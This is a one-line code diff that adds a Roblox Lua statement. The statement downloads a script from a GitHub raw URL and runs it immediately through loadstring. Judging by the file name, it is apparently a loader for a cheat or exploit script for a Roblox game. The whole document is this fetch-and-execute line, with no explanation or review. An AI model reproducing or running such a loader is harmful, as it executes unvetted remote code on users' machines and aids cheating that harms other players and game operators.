@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/fish-an-anime-rng-spam4-m8aklfq2g1ni17.lua"))()
